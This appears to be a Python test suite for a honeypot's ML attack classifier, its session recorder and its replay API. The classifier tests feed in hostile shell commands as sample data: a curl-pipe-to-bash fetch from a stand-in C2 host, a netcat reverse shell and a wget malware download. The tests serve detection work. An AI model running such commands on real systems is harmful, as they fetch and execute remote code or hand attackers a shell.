"""
Comprehensive Automated Verification Suite for Phase 3 (v1.2):
1. ML Attack Classifier & Feature Engineering
2. Terminal Session Recorder & Asciinema Replay System
3. Authenticated Replay API Endpoints
"""

import sys
import os
import json

PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

def test_1_ml_classifier():
    print("\n[+] TEST 1: Machine Learning Threat Classifier")
    from analysis.ml_classifier import classify_attack_ml, extract_features
    from analysis.fingerprint import analyze_event

    # 1. Feature Extraction Verification
    feat = extract_features(
        service="SSH",
        username="root",
        password="password123",
        command="curl http://c2.evil.com/payload.sh | bash",
        attempt_count=6,
        is_tor=True
    )
    assert len(feat) == 19, f"Feature vector length must be 19, got {len(feat)}"
    assert feat[5] == 1.0, "URL indicator must be active"
    assert feat[6] == 1.0, "Pipe/chain indicator must be active"
    assert feat[8] == 1.0, "Download indicator must be active"
    print("  -> Feature engineering: verified 19 security features.")

    # 2. Vector classification
    rev_res = classify_attack_ml(service="SSH", command="nc -e /bin/sh 10.0.0.1 4444")
    assert rev_res["attack_type"] == "reverse_shell"
    assert rev_res["mitre_id"] == "T1059.004"
    assert rev_res["confidence"] >= 0.85

    dl_res = classify_attack_ml(service="SSH", command="wget http://185.220.101.35/bot.sh")
    assert dl_res["attack_type"] == "malware_download"
    assert dl_res["mitre_id"] == "T1105"

    bf_res = classify_attack_ml(service="SSH", username="root", password="123", attempt_count=10)
    assert bf_res["attack_type"] == "brute_force"
    assert bf_res["mitre_id"] == "T1110"

    print("  -> ML categorization: reverse shell, malware download, and brute force classified correctly.")

    # 3. Pipeline integration
    fp_res = analyze_event(
        source_ip="127.0.0.1",
        service="SSH",
        username="root",
        command="whoami",
        attempt_count=1
    )
    assert fp_res["attack_type"] == "recon"
    assert "ml_confidence" in fp_res
    assert "anomaly_score" in fp_res
    assert fp_res["mitre_id"] == "T1082"
    print("  -> Pipeline integration: analyze_event incorporates ML outputs.")


def test_2_session_recording_and_persistence():
    print("\n[+] TEST 2: Terminal Session Recording & Persistence")
    from sessions.session_recorder import (
        session_recorder,
        get_session_replay,
        list_session_replays,
        create_sample_replay
    )
    from database.database import init_db, SessionLocal
    from database.models import SessionRecording
    import time

    init_db()

    # 1. Live recording simulation
    test_session_id = f"test-session-{int(time.time())}"
    session_recorder.start_recording(test_session_id, ip="192.168.1.55", service="SSH", username="root")
    session_recorder.record_event(test_session_id, "o", "Welcome to Ubuntu 22.04\r\nroot@honeypot:~# ")
    session_recorder.record_event(test_session_id, "o", "w")
    session_recorder.record_event(test_session_id, "o", "hoami\r\n")
    session_recorder.record_command(test_session_id, "whoami")
    session_recorder.record_event(test_session_id, "o", "root\r\nroot@honeypot:~# ")
    
    saved_rec = session_recorder.finalize_recording(test_session_id, is_demo=False)
    assert saved_rec is not None, "Recording must finalize successfully"

    # 2. Database lookup
    replay = get_session_replay(test_session_id)
    assert replay is not None, "Saved recording must be retrievable from database"
    assert replay["source_ip"] == "192.168.1.55"
    assert replay["username"] == "root"
    assert replay["commands_count"] == 1
    assert len(replay["events"]) >= 4
    print(f"  -> Session {test_session_id}: recorded {len(replay['events'])} events, retrievable from DB.")

    # 3. Sample replay generator
    demo_sid = f"demo-test-{int(time.time())}"
    create_sample_replay(
        session_id=demo_sid,
        ip="45.155.205.233",
        username="attacker",
        commands=[("id", "uid=0(root) gid=0(root)"), ("exit", "logout")],
        is_demo=True
    )
    demo_replay = get_session_replay(demo_sid)
    assert demo_replay is not None
    assert demo_replay["is_demo"] is True
    print(f"  -> Synthesized sample replay {demo_sid}: generated {len(demo_replay['events'])} events.")


def test_3_session_api_endpoints():
    print("\n[+] TEST 3: Authenticated Session Replay API Endpoints")
    from api.app import create_app
    app = create_app()
    client = app.test_client()

    # 1. Unauthenticated request must return 401
    r_unauth = client.get("/api/sessions")
    assert r_unauth.status_code == 401, f"Expected 401 for unauth /api/sessions, got {r_unauth.status_code}"

    # 2. Authenticated request using session
    with client.session_transaction() as sess:
        sess["user_id"] = 1
        sess["user_email"] = "operator@honeytrack.local"

    r_auth = client.get("/api/sessions")
    assert r_auth.status_code == 200, f"Expected 200 for auth /api/sessions, got {r_auth.status_code}"
    data = r_auth.get_json()
    assert data["status"] == "success"
    assert "sessions" in data
    assert len(data["sessions"]) > 0
    first_session_id = data["sessions"][0]["session_id"]
    print(f"  -> GET /api/sessions: returned {len(data['sessions'])} sessions.")

    # 3. Retrieve specific session replay
    r_replay = client.get(f"/api/sessions/{first_session_id}/replay")
    assert r_replay.status_code == 200
    replay_data = r_replay.get_json()
    assert replay_data["status"] == "success"
    assert "events" in replay_data["session"]
    print(f"  -> GET /api/sessions/{first_session_id}/replay: returned full event stream ({len(replay_data['session']['events'])} chunks).")


if __name__ == "__main__":
    test_1_ml_classifier()
    test_2_session_recording_and_persistence()
    test_3_session_api_endpoints()
    print("\n==========================================")
    print("PHASE 3 (ML + SESSION REPLAY) TESTS PASSED (100% OK)")
    print("==========================================\n")
